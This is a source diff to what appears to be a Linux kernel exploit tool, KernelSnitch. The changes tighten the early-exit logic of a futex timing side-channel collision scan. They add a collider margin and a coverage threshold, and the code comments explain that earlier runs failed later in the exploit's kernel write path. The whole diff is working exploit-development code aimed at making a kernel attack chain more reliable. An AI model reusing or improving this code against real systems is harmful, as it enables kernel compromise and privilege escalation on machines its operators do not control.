@@ -389,6 +389,16 @@ KernelSnitchContext *kernelsnitch_context_init(size_t __mm_struct_sz,
 #ifndef KERNELSNITCH_EARLY_CHEAP_POOL
 #define KERNELSNITCH_EARLY_CHEAP_POOL 16
 #endif
+/* Extra independent colliders the cheap screen must prove beyond the strict
+ * minimum before the scan is allowed to stop early. */
+#ifndef KERNELSNITCH_EARLY_CHEAP_MARGIN
+#define KERNELSNITCH_EARLY_CHEAP_MARGIN 2
+#endif
+/* How much of the candidate pool must have been scanned before an early exit is
+ * accepted at all, as a percentage of total_futexes. */
+#ifndef KERNELSNITCH_EARLY_MIN_COVERAGE_PCT
+#define KERNELSNITCH_EARLY_MIN_COVERAGE_PCT 50
+#endif
 
 typedef struct { size_t t, addr; } coll_cand_t;
 
@@ -500,6 +510,7 @@ static size_t __collision_pass(struct kernelsnitch_shared_state *ks, size_t scan
                         wanted > KERNELSNITCH_EARLY_CHEAP_POOL ||
                         wanted > KERNELSNITCH_COLLISION_POOL);
     int full_probed = (full_probe_after >= ks->total_futexes || wanted > KERNELSNITCH_COLLISION_POOL);
+    int full_defer_logged = 0;
     for (size_t i = 2; i < ks->total_futexes; ++i) {
         if (ks->verbose && (i % 256) == 0)
             pr_info("  collision scan %zu/%zu\n", i, ks->total_futexes);
@@ -525,9 +536,30 @@ static size_t __collision_pass(struct kernelsnitch_shared_state *ks, size_t scan
             cheap_probed = 1;
             coll_cand_t cheap_verified[KERNELSNITCH_COLLISION_POOL];
             size_t screened = __screen_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg, KERNELSNITCH_EARLY_CHEAP_POOL, cheap_verified);
-            pr_info("[spray] early collision screen %zu/%zu at %zu%%\n",
-                    screened, wanted, ks->total_futexes ? i * 100 / ks->total_futexes : 0);
-            if (screened >= wanted) {
+            size_t pct = ks->total_futexes ? i * 100 / ks->total_futexes : 0;
+            /* Early-exit quality gate.
+             *
+             * This shortcut used to stop the scan as soon as the cheap screen could
+             * prove `wanted` colliders, which on this device fires at roughly a
+             * quarter of the pool.  Those runs kept dying later, in the write path,
+             * and the observed failure rate tracks machine load -- i.e. the accepted
+             * set was only just above the noise floor, with no spare corroboration.
+             * So squeeze the shortcut from both sides: it must prove more colliders
+             * than the strict minimum, and the scan must already have covered a real
+             * part of the pool.  The loop being deferred here is a timing measurement
+             * pass (no kernel state has been forged yet), so declining the shortcut
+             * only costs a longer scan; find_collisions()'s conservative retry and
+             * the full-pool verify after the loop stay exactly as they were. */
+            size_t early_need = wanted + KERNELSNITCH_EARLY_CHEAP_MARGIN;
+            if (early_need > KERNELSNITCH_EARLY_CHEAP_POOL)
+                early_need = KERNELSNITCH_EARLY_CHEAP_POOL;
+            int gate_ok = (screened >= early_need &&
+                           pct >= (size_t)KERNELSNITCH_EARLY_MIN_COVERAGE_PCT);
+            pr_info("[spray] early collision screen %zu/%zu at %zu%% (gate: >=%zu colliders, >=%d%% coverage)%s\n",
+                    screened, wanted, pct, early_need,
+                    KERNELSNITCH_EARLY_MIN_COVERAGE_PCT,
+                    gate_ok ? "" : " -> deferred");
+            if (gate_ok) {
                 size_t count = __prove_collision_pool(ks, cheap_verified, screened, verify_approx_time, verify_repeat, verify_avg, ID, 0);
                 if (count == wanted) {
                     free(best);
@@ -537,14 +569,31 @@ static size_t __collision_pass(struct kernelsnitch_shared_state *ks, size_t scan
             }
         }
         if (!full_probed && i >= full_probe_after && best[wanted - 1].t) {
-            full_probed = 1;
-            if (ks->verbose) pr_info("early verifying at scan %zu/%zu\n", i, ks->total_futexes);
-            size_t count = __verify_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg, KERNELSNITCH_COLLISION_POOL, ID, 0);
-            if (count == wanted) {
-                free(best);
-                return count;
+            size_t full_pct = ks->total_futexes ? i * 100 / ks->total_futexes : 0;
+            if (full_pct < (size_t)KERNELSNITCH_EARLY_MIN_COVERAGE_PCT) {
+                /* Same coverage floor as the cheap screen above -- and here it is
+                 * the only knob, because __prove_collision_pool() stops as soon as
+                 * it has `wanted` colliders, so no margin is observable on this
+                 * path.  `full_probe_after` lands only ~3 points after the cheap
+                 * threshold (34% vs 31% on an 8-collision profile), so without this
+                 * the cheap gate above would barely move anything: hold off, leave
+                 * `full_probed` clear so the check fires again once the pool has
+                 * actually been measured, and say so once. */
+                if (!full_defer_logged) {
+                    full_defer_logged = 1;
+                    pr_info("[spray] early verification deferred at %zu%% (gate: >=%d%% coverage)\n",
+                            full_pct, KERNELSNITCH_EARLY_MIN_COVERAGE_PCT);
+                }
+            } else {
+                full_probed = 1;
+                if (ks->verbose) pr_info("early verifying at scan %zu/%zu\n", i, ks->total_futexes);
+                size_t count = __verify_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg, KERNELSNITCH_COLLISION_POOL, ID, 0);
+                if (count == wanted) {
+                    free(best);
+                    return count;
+                }
+                if (ks->verbose) pr_info("early verification found %zu/%zu collisions, continuing scan\n", count, wanted);
             }
-            if (ks->verbose) pr_info("early verification found %zu/%zu collisions, continuing scan\n", count, wanted);
         }
     }
     size_t count = __verify_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg, KERNELSNITCH_COLLISION_POOL, ID, 1);
